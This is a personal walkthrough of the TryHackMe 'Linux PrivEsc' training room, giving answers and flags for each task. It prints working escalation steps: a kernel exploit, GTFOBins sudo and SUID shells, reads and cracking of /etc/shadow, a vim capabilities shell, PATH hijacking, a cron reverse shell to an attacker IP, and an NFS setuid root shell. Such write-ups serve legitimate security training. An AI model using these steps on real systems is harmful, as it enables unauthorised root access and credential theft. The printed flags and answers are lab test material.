---
description: 'This is my walkthrough for the TryHackMe Room: Linux PrivEsc.'
---

# Linux PrivEsc

This room can be found [here](https://tryhackme.com/room/linprivesc). This room covers a few methods of escalating from a normal user to the root user on a system.&#x20;

## Task 3

This task has us launch a machine and access it via the browser **OR** ssh into the machine with the username `karen` and password `Password1`.

Enumeration is typically one of the first steps you take when gaining access to a system.&#x20;

### Question 1: What is the hostname of the target system?

`wade7363` - We run `hostname` to find our answer.

### Question 2: What is the Linux kernel version of the target system?

`3.13.0-24-generic` - We can run `uname -a` to find this info

### Question 3: What Linux is this?

`Ubuntu 14.04 LTS` - We can run cat `/etc/issue` OR cat `/etc/os-release` to find this issue

### Question 4: What version of the Python language is installed on the system?

`2.7.6` - Running `python -V` will show this info

### Question 5: What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)

`CVE-2015-1328` - If we search our kernel version, `3.13.0-24-generic`,  on ExploidDB we find [this CVE](https://www.exploit-db.com/exploits/37292).&#x20;

## Task 5

This task has us find a vulnerability (found from task 3) to exploit the machine with to gain access to the root account. We will obtain .c file exploit, get it to our victim machine, compile it, run it, and become root.

### Question 1: What is the content of the flag1.txt file?

`THM-28392872729920` - After downloading the .c file exploit from Task 3, we can get it onto our victim machine in whatever we can. A common way is via a Python Webserver.

![](<../../../.gitbook/assets/image (173).png>)

Now we can `wget` the file to the `/tmp/` directory on the victim

![](<../../../.gitbook/assets/image (52).png>)

Now we need to compile the code. `gcc pwn.c -o pwned` and execute the new file `./pwned`

![](<../../../.gitbook/assets/image (42).png>)

We verify we have escalated our privilege and are the root user with `whoami`. We should see root.

To find the flag I ran `find / -name flag*.txt`.

We can now `cat` the file to receive our flag.

![](<../../../.gitbook/assets/image (122).png>)

## Task 6

### Question 1: How many programs can the user "karen" run on the target system with sudo rights?

`3` - we can run `sudo -l` to find this answer. She has access to `find`, `less`, and `nano`.

![](<../../../.gitbook/assets/image (51).png>)

### Question 2: What is the content of the flag2.txt file?

`THM-402028394` - We cna look on [GTFOBins](https://gtfobins.github.io/) and look for ways to use the commands Karen does have access to run with sudo rights. Looking up find we see:

![](<../../../.gitbook/assets/image (144).png>)

So let's run `sudo find . -exec /bin/sh ; -quit` and see if we get root.

![](<../../../.gitbook/assets/image (100).png>)

We do! So now we can find our flag.

![](<../../../.gitbook/assets/image (162).png>)

### Question 3: How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?

`sudo nmap --interactive` - Searching for Nmap on [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/) will give us our answer.

### Question 4: What is the hash of frank's password?

`$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1` - The `/etc/shadow` file contains information about a Linux system's users, their passwords, and more. So if we cat that file, we can get franks password hash

![](<../../../.gitbook/assets/image (85).png>)

## Task 7

### Question 1: Which user shares the name of a great comic book writer?

`gerryconway` - Like in Task 6, we can list users and password using /etc/shadow, except we don't have permission, there is another file we can view though. `/etc/passwd`.

![](<../../../.gitbook/assets/image (86).png>)

Be sure to copy the contents of the /etc/passwd file to a .txt file

### Question 2: What is the password of user2?

`Password1` - The room lets us know we can run `find / -type f -perm -04000 -ls 2>/dev/null` to find  SUID permissions. After looking through this list and comparing it to [GTFOBins](https://gtfobins.github.io/#+suid), I find one that they have in common, base64.

![](<../../../.gitbook/assets/image (47).png>)

This basically says if we assign the variable of LFILE to to a file, then use base64 to encode, then decode that file, we can then read that file. Since we are after the password for the user, we want to the see the `/etc/shadow` file.

`LFILE=/etc/shadow`

`base64 "$LFILE" | base64 --decode`

![](<../../../.gitbook/assets/image (8).png>)

Now we can use unshadow from the JohnTheRipper package to combine the files

![](<../../../.gitbook/assets/image (128).png>)

![](<../../../.gitbook/assets/image (109).png>)

Time to crack the passwords!

`john --wordlist=(WORDLIST.TXT) (FILE.TXT)`

![](<../../../.gitbook/assets/image (107).png>)

![](<../../../.gitbook/assets/image (32).png>)

### Question 3: What is the content of the flag3.txt file?

`THM-3847834` - Since we execute commands as root using the base64 SUID, we can find this with the same method.

Running `find / -name flag3.txt` reveals it is under `/home/ubuntu/,` so cd to that directory.

![](<../../../.gitbook/assets/image (50).png>)

## Task 8

This task focuses on Capabilities to gain root access. Root gives Karen access to use vim, but that is all. This shows us how that can be leveraged to become root.

### Question 1: How many binaries have set capabilities?

`6` - Running `getcap -r / 2>/dev/null` will give us our answer. If we ran this without the `2>/dev/null` we would also see a lot of errors on screen.

![](<../../../.gitbook/assets/image (113).png>)

### Question 2: What other binary can be used through its capabilities?

`View` - Since we can see that Karen can use vim, we look through the [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) to see that we can escalate our privileges. If we `ls` we see karen has a vim file in her directory, but it's owned by root, which means we can leverage this to gain root.

&#x20;After testing the first 2 Shell options, I found the 3rd option worked ./`vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`. Running THIS vim rather than the one inside of `/usr/bin/` will get us our root shell.

### Questionn 3:What is the content of the flag4.txt file?

`THM-9349843` - After obtaining root, we can find the file location, cat it, obtaining our answer.

![](<../../../.gitbook/assets/image (23).png>)

## Task 9

In this task we figure out how leverage Cron Jobs, schedule tasks, to become root.

### Question 1: How many user-defined cron jobs can you see on the target system?

`4` - We can look at /`etc/crontab` to find this answer. This is available for nay user to look at.

![](<../../../.gitbook/assets/image (121).png>)

### Question 2: What is the content of the flag5.txt file?

`THM-383000283` - If we `ls` we see we have a `backup.sh` file, which that is also in our `crontab`. We can look at the contents on the backup.sh file, also make a backup of it as well with `cp backup.sh backup.sh.bak`. Looking at the original with ls -l, we notice it is not executable, so let's fix that with `chmod +x backup.sh`. We can edit the .sh file and add in a reverse shell command.

`bash -i >& /dev/tcp/<OUR_MACHINE_IP>/<PORT> 0>&1`

![](<../../../.gitbook/assets/image (45).png>)

In another terminal we can start our netcat listener

![](<../../../.gitbook/assets/image (67).png>)

Now we wait for the crontab to run. After a minute or two, we should receive our root shell.

![](<../../../.gitbook/assets/image (387).png>)

![](<../../../.gitbook/assets/image (371).png>)

### Question 3: What is Matt's password?

`123456` - Running `cat /etc/shadow | grep matt` will give us his hash. Copy that to a .txt file and crack it.

![](<../../../.gitbook/assets/image (148).png>)

## Task 10

### Question 1: What is the odd folder you have write access for?

`/home/murdoch` - Running `find / -writable 2>/dev/null | grep home | cut -d "/" -f 2,3 | sort -u` will show us our answer. So we have write access to murdochs home folder.

### Question 2: What is the content of the flag6.txt file?

`THM-736628929` - The hint from the question with no answer is "You can add the writable directory to your user's PATH and create a file named "thm" that the "./test" executable will read. The "thm" file can simply be a "cat" command that will read the flag file."

First we need to locate the file.

![](<../../../.gitbook/assets/image (149).png>)

Now we `echo $PATH`

![](<../../../.gitbook/assets/image (77).png>)

Now we add the folder we have write access to, to our path with `export PATH=/home/murdoch:$PATH`.

Now we create a file called `thm` with the contents of `cat /home/matt/flag6.txt` under `/home/murdoch`, then we change the permissions of the file with `chmod 777 thm`.

From here we can run `./test` and obtain our flag.

![](<../../../.gitbook/assets/image (152).png>)

## Task 11

### Question 1: How many mountable shares can you identify on the target system?

`3` - Running `showmount -e (IP`) will give us our answer

![](<../../../.gitbook/assets/image (19).png>)

### Question 2: How many shares have the "no\_root\_squash" option enabled?

`3` - Running cat `/etc/exports` will give us our answer. This checks the NFS configuration

![](<../../../.gitbook/assets/image (20).png>)

### Question 3: What is the content of the flag7.txt file?

`THM-89384012` - We can now mount the NFS onto our machine `mount -o rw (IP):(FOLDER) (FOLDER_ON_OUR_MACHINE)`

![](<../../../.gitbook/assets/image (43).png>)

The room gives us an executable we can run on the machine. I made a file nfs.c with the contents

```
int main()
{ setgid(0);
 setuid(0);
 system("/bin/bash");
 return 0;
}
```

Now we can compile it with `gcc nfs.c -o nfs -w`. Change the permissions of the file, `chmod +s nfs`

We can now execute the file on the target machine from the tmp directory, `cd /tmp && ./nfs` and obtain root. We can then obtain our flag with `cat /home/matt/flag7.txt`.

## Task 12

* User: leonard
* Password: Penny123

For this, this is  utilizing how a lot of the tools and methods we have used in the previous tasks. We can SSH into the machine and begin.&#x20;

We can use tools such as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) that was discussed in Task4 but for now we'll go over the manual ways that were covered.

### Question 1: What is the content of the flag1.txt file?

`THM-42828719920544` -&#x20;

Started this by looking at the SUID Permissions.

![](<../../../.gitbook/assets/image (81).png>)

We can see that base64 can be used. So as in Task 7, we can follow the same suit.

![](<../../../.gitbook/assets/image (418).png>)

So let's try to cat the /etc/shadow file.

`LFILE=/etc/shadow`

`base64 "$LFILE" | base64 --decode`

![](<../../../.gitbook/assets/image (338).png>)

We can get the hashes for root, and missy.

`root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::`

`missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::`

We can put these files in a .txt file and attempt to crack them.

![](<../../../.gitbook/assets/image (163).png>)

We got the password for Missy! So lets switch users to missy. `su missy`

![](<../../../.gitbook/assets/image (14).png>)

`sudo find / -name flag*.txt` We now have the location of our flags as well

![](<../../../.gitbook/assets/image (116).png>)

### Question 2: What is the content of the flag2.txt file?

`THM-168824782390238` -&#x20;

![](<../../../.gitbook/assets/image (192).png>)

Sadly we don't have permission to the 2nd flag but lets see what sudo permissions Missy has with `sudo -l`

![](<../../../.gitbook/assets/image (156).png>)

We see Missy can run `find`. Similar to task 6, we can use the GTFO bin we used for that.

![](<../../../.gitbook/assets/image (134).png>)

`sudo find . -exec /bin/sh ; -quit`

![](<../../../.gitbook/assets/image (155).png>)

We are now root, can cat our file for our final flag!

`cat /home/rootflag/flag2.txt`

![](<../../../.gitbook/assets/image (66).png>)

## Congratulations! You have completed the Linux PrivEsc room!
